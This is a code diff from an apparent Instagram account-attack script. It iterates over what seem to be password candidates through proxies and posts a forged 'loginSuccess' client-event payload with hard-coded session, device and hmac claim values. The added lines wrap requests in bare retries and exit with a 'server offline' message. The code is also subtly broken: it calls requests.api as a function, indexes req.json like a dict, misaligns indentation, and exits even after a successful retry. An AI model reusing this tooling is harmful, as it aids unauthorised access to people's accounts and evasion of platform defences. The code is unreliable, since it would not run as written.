@@ -115,7 +115,10 @@ for pss in ps:
             try:
                 req = requests.api(host, headers=head)
             except:
-                req = requests.get(host, headers=head)
+                try:
+                    req = requests.get(host, headers=head)
+                except:
+                    None
             try:
                 token = req.json['access_token']
             except:
@@ -125,8 +128,29 @@ for pss in ps:
             except:
                 None
             json = {'access_token': token, 'message': message}
-            the = {"access_token": token,"message": "{\"app_id\":\"936619743392459\",\"app_ver\":\"1.0.0\",\"data\":[{\"time\":1657390570.175,\"name\":\"instagram_web_client_events\",\"extra\":{\"event_type\":\"action\",\"event_name\":\"loginSuccess\",\"mid\":\"YslyOQALAAHlCPDuzqWqZW4GIOTP\",\"rollout_hash\":\"ebe60d79ce7c\",\"frontend_env\":\"prod\",\"app_id\":\"936619743392459\",\"fb\":false,\"platform\":\"windows_nt_10\",\"source\":\"loginPage\",\"referrer\":\"/accounts/login/?source=auth_switcher\",\"referrer_domain\":\"www.instagram.com\",\"original_referrer\":\"https://www.google.com/\",\"original_referrer_domain\":\"www.google.com\"},\"module\":\"loginPage\",\"obj_type\":\"url\",\"obj_id\":\"/accounts/login/?source=auth_switcher\"},{\"time\":1657390570.185,\"name\":\"instagram_web_time_spent_navigation\",\"extra\":{\"rollout_hash\":\"ebe60d79ce7c\",\"frontend_env\":\"prod\",\"app_id\":\"936619743392459\",\"event\":\"unload\",\"client_time\":1657390570184,\"time_spent_id\":\"qsqy2g\",\"extra_data\":{},\"source_endpoint\":\"loginPage\",\"referrer\":\"/accounts/login/?source=auth_switcher\",\"referrer_domain\":\"www.instagram.com\",\"url\":\"/accounts/login/?source=auth_switcher\",\"original_referrer\":\"https://www.google.com/\",\"original_referrer_domain\":\"www.google.com\"}}],\"log_type\":\"client_event\",\"seq\":16,\"session_id\":\"181e429fec8-13aece\",\"device_id\":\"3BAF6D5C-0E19-4B2C-A71F-B2A791E6C65C\",\"claims\":[\"hmac.AR251Qhmn7X4ARb3A9GGxEaSfeBq2qC24nBwdcMmq5I-TQna\"]}"}           
-            rq = requests.post(server, headers=headers, data=data, proxies=proxi)
+            the = {'access_token': token,'message': '{\"app_id\":\"936619743392459\",\"app_ver\":\"1.0.0\",\"data\":[{\"time\":1657390570.175,\"name\":\"instagram_web_client_events\",\"extra\":{\"event_type\":\"action\",\"event_name\":\"loginSuccess\",\"mid\":\"YslyOQALAAHlCPDuzqWqZW4GIOTP\",\"rollout_hash\":\"ebe60d79ce7c\",\"frontend_env\":\"prod\",\"app_id\":\"936619743392459\",\"fb\":false,\"platform\":\"windows_nt_10\",\"source\":\"loginPage\",\"referrer\":\"/accounts/login/?source=auth_switcher\",\"referrer_domain\":\"www.instagram.com\",\"original_referrer\":\"https://www.google.com/\",\"original_referrer_domain\":\"www.google.com\"},\"module\":\"loginPage\",\"obj_type\":\"url\",\"obj_id\":\"/accounts/login/?source=auth_switcher\"},{\"time\":1657390570.185,\"name\":\"instagram_web_time_spent_navigation\",\"extra\":{\"rollout_hash\":\"ebe60d79ce7c\",\"frontend_env\":\"prod\",\"app_id\":\"936619743392459\",\"event\":\"unload\",\"client_time\":1657390570184,\"time_spent_id\":\"qsqy2g\",\"extra_data\":{},\"source_endpoint\":\"loginPage\",\"referrer\":\"/accounts/login/?source=auth_switcher\",\"referrer_domain\":\"www.instagram.com\",\"url\":\"/accounts/login/?source=auth_switcher\",\"original_referrer\":\"https://www.google.com/\",\"original_referrer_domain\":\"www.google.com\"}}],\"log_type\":\"client_event\",\"seq\":16,\"session_id\":\"181e429fec8-13aece\",\"device_id\":\"3BAF6D5C-0E19-4B2C-A71F-B2A791E6C65C\",\"claims\":[\"hmac.AR251Qhmn7X4ARb3A9GGxEaSfeBq2qC24nBwdcMmq5I-TQna\"]}'}
+            num = 0
+            number = 10
+            num = int(num)
+            number = int(number)
+            try:
+                rq = requests.post(server, headers=headers, data=data, proxies=proxi)
+            except:
+                while num < number:
+                    time.sleep(0.4)
+                    try:
+                        rq = requests.post(server, headers=headers, data=data, proxies=proxi)
+                        break
+                     except:
+                         pass
+                     num = (num+1)
+                time.sleep(0.5)
+                print ('\n\033[31m[!] \033[35mserver offline')
+                time.sleep(0.8)
+                try:
+                    exit (2)
+                except:
+                    sys.exit()
             try:
                 requests.post(host, headers=headers, json=the, proxies=proxi)
             except:
